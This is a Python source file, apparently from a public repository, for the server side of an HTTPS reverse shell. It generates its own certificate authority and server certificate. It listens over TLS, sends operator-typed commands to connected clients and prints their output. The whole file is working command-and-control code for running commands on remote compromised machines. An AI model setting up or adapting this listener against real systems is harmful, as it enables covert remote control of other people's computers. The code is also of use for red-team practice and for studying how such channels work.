#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import json
import ssl
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs

from trustme import CA


class ShellHandler(BaseHTTPRequestHandler):
    def _set_headers(self, response_code: int = 200) -> None:
        self.send_response(response_code)
        self.end_headers()

    def do_GET(self) -> None:
        self.send_header("Content-type", "application/json")
        self._set_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length"))
        request_body: dict[str, list[str]] = parse_qs(
            self.rfile.read(length).decode())
        for mode, args in request_body.items():
            try:
                getattr(self, f"_{mode}")(args)
            except AttributeError:
                self._set_headers(404)

    def _prompt(self, shell_info: list[str]) -> None:
        gc, nc = "\x1b[0;32m", "\x1b[0m"  # green color, no color
        shell = "{0}[{1}:{2}]{3} {4}".format(gc, *self.client_address,
                                             nc, *shell_info)
        try:
            response = input(shell)
        except EOFError:
            raise KeyboardInterrupt
        self._set_headers()
        self.wfile.write(response.encode())

    def _output(self, client_output: list[str]) -> None:
        print(*client_output, end="")
        self._set_headers()

    def log_message(self, *args, **kwargs):
        """Suppress display of log messages on STDOUT."""
        pass


class ShellServer:
    def __init__(self,
                 host: str,
                 port: int, *,
                 server_cert: [str, Path] = None,
                 ca_cert: [str, Path] = None,
                 ca_private_key: [str, Path] = None):
        self._host = host
        self._port = port
        self._ca = None
        self.ca_private_key = ca_private_key
        self.ca_cert = ca_cert
        self.server_cert = server_cert
        self.server_address = self._host, self._port

    @property
    def ca_cert(self) -> Path:
        return self._ca_cert

    @ca_cert.setter
    def ca_cert(self, path: [str, Path, None]):
        try:
            self._ca_cert = Path(path)
            if self.ca_private_key is None:
                raise SystemExit("The private key for the Certificate "
                                 "Authority is required for signing new client "
                                 "certificates.")
            self._ca = CA.from_pem(
                cert_bytes=bytes(self._ca_cert),
                private_key_bytes=bytes(self.ca_private_key))
        except TypeError:
            self._ca_cert = Path(__file__).parent.joinpath("ca.pem")
            self._ca = CA()
            self._ca.cert_pem.write_to_path(str(self._ca_cert))

    @property
    def server_cert(self) -> Path:
        return self._server_cert

    @server_cert.setter
    def server_cert(self, path: [str, Path, None]):
        try:
            self._server_cert = Path(path)
        except TypeError:  # path is None
            self._server_cert = Path(__file__).parent.joinpath("server.pem")
            server_cert = self._ca.issue_cert(self._host)
            server_cert.private_key_and_cert_chain_pem.write_to_path(
                str(self._server_cert))

    def execute(self) -> None:
        with HTTPServer(self.server_address, ShellHandler) as httpd:
            try:
                print("[+] Server started on https://{0}:{1}".format(
                    *self.server_address))
                print("[+] Waiting for connections...\n")
                httpd.socket = ssl.wrap_socket(sock=httpd.socket,
                                               server_side=True,
                                               certfile=str(self.server_cert),
                                               ssl_version=ssl.PROTOCOL_TLS)
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[!] Shutting down the server...")


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description="Basic HTTPS Reverse Shell Server")
    parser.add_argument("--host",
                        type=str,
                        default="localhost",
                        metavar="<hostname>",
                        help="Server address or hostname.")
    parser.add_argument("-p", "--port",
                        type=int,
                        default=4443,
                        metavar="<port>",
                        help="Port number to bind the server to.")
    parser.add_argument("--server-cert",
                        type=str,
                        default=None,
                        metavar="<path>",
                        help="Absolute path to a file containing the server's "
                             "certificate.")
    parser.add_argument("--ca-cert",
                        type=str,
                        default=None,
                        metavar="<path>",
                        help="Absolute path to a file containing the "
                             "certificate for the Certificate Authority (CA).")
    parser.add_argument("--ca-private-key",
                        type=str,
                        default=None,
                        metavar="<path>",
                        help="Absolute path to a file containing the private "
                             "key of the Certificate Authority (CA).")

    _args = parser.parse_args()

    ShellServer(host=_args.host,
                port=_args.port,
                server_cert=_args.server_cert,
                ca_cert=_args.ca_cert,
                ca_private_key=_args.ca_private_key).execute()
